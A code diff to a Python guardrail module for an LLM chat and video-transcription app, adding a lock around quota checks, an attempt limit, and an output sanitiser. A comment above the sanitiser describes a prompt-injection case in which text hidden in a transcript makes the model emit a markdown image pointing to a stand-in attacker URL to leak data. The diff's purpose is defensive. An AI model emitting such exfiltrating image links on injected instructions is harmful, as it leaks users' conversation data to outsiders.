@@ -85,6 +85,12 @@ def validate_upload(filename: str, size: int) -> str:
     return UPLOAD_FORMATS[ext]
 
 
+# Check-then-record must be one step: otherwise several tabs of one user can
+# all pass a check before any of them records, and overshoot the limit.
+# One process serves every session, so a process-wide lock is enough.
+_quota_lock = threading.Lock()
+
+
 def check_question(user, question: str) -> str:
     """Validate a chat message and count it against the user's limits."""
     settings = get_settings()
@@ -94,15 +100,16 @@ def check_question(user, question: str) -> str:
     if len(question) > settings.max_question_chars:
         raise GuardrailError(f"Questions can be at most {settings.max_question_chars} characters.")
 
-    # The per-minute limit applies to admins too: it stops runaway scripts or
-    # a stuck key, not ordinary use.
-    if db.total_since(user.id, "question", time.time() - 60) >= settings.questions_per_minute:
-        raise QuotaExceeded("You're sending questions too quickly. Wait a minute and try again.")
-    if not user.is_admin and db.total_since(user.id, "question", day_start()) >= settings.questions_per_day:
-        raise QuotaExceeded(
-            f"You've reached today's limit of {settings.questions_per_day} questions. It resets at 00:00 UTC."
-        )
-    db.record_event(user.id, "question")
+    with _quota_lock:
+        # The per-minute limit applies to admins too: it stops runaway scripts
+        # or a stuck key, not ordinary use.
+        if db.total_since(user.id, "question", time.time() - 60) >= settings.questions_per_minute:
+            raise QuotaExceeded("You're sending questions too quickly. Wait a minute and try again.")
+        if not user.is_admin and db.total_since(user.id, "question", day_start()) >= settings.questions_per_day:
+            raise QuotaExceeded(
+                f"You've reached today's limit of {settings.questions_per_day} questions. It resets at 00:00 UTC."
+            )
+        db.record_event(user.id, "question")
     return question
 
 
@@ -135,6 +142,24 @@ def check_can_start_video(user):
         )
 
 
+def start_attempt(user):
+    """
+    Count every processing attempt, not only successful ones, when the job
+    slot is taken. Downloads and conversions that fail are never charged as
+    videos, so without this a user could keep the shared slot busy for free
+    with files that fail slowly.
+    """
+    settings = get_settings()
+    with _quota_lock:
+        if not user.is_admin:
+            limit = 3 * max(1, settings.videos_per_day)
+            if db.total_since(user.id, "attempt", day_start()) >= limit:
+                raise QuotaExceeded(
+                    f"You've reached today's limit of {limit} processing attempts. It resets at 00:00 UTC."
+                )
+        db.record_event(user.id, "attempt")
+
+
 def charge_video(user, minutes: float):
     """
     Called once the audio length is known and before transcription, the first
@@ -142,16 +167,23 @@ def charge_video(user, minutes: float):
     transcription was paid for.
     """
     settings = get_settings()
-    if not user.is_admin:
-        used = db.total_since(user.id, "audio_minutes", day_start())
-        left = settings.audio_minutes_per_day - used
-        if minutes > left:
-            raise QuotaExceeded(
-                f"This recording is {minutes:.0f} min, but you have {max(0, left):.0f} min "
-                "of processing left today. It resets at 00:00 UTC."
-            )
-    db.record_event(user.id, "video")
-    db.record_event(user.id, "audio_minutes", round(minutes, 2))
+    with _quota_lock:
+        if not user.is_admin:
+            since = day_start()
+            # Checked again here: another of the user's sessions may have
+            # finished a video since check_can_start_video ran.
+            if db.total_since(user.id, "video", since) >= settings.videos_per_day:
+                raise QuotaExceeded(
+                    f"You've reached today's limit of {settings.videos_per_day} videos. It resets at 00:00 UTC."
+                )
+            left = settings.audio_minutes_per_day - db.total_since(user.id, "audio_minutes", since)
+            if minutes > left:
+                raise QuotaExceeded(
+                    f"This recording is {minutes:.0f} min, but you have {max(0, left):.0f} min "
+                    "of processing left today. It resets at 00:00 UTC."
+                )
+        db.record_event(user.id, "video")
+        db.record_event(user.id, "audio_minutes", round(minutes, 2))
 
 
 def usage_summary(user) -> dict:
@@ -194,17 +226,18 @@ def job_slot(user_id: str):
 
 # Outputs
 
-# Markdown images load as soon as the answer renders, so an instruction hidden
+# Markdown images load as soon as the text renders, so an instruction hidden
 # in a transcript could make the model emit ![](https://attacker/?q=...) and
-# leak text through the URL. Keep the alt text and drop the image.
-_INLINE_IMAGE = re.compile(r"!\[([^\]]*)\]\([^)]*\)")
-_REF_IMAGE = re.compile(r"!\[([^\]]*)\]\[[^\]]*\]")
+# leak text through the URL. Matching image syntax is a losing game (nested
+# brackets, reference definitions, escapes), but every CommonMark image starts
+# with "![". Escaping that "!" turns each one into an ordinary link, which
+# loads nothing unless the reader clicks it.
+_IMAGE_START = re.compile(r"!(?=\[)")
 
 
 def clean_answer(text: str) -> str:
-    text = _INLINE_IMAGE.sub(r"\1", text or "")
-    text = _REF_IMAGE.sub(r"\1", text)
-    return text.strip()
+    """Make LLM output safe to render: used for chat answers and summaries."""
+    return _IMAGE_START.sub(r"\\!", text or "").strip()
 
 
 _FRIENDLY = {
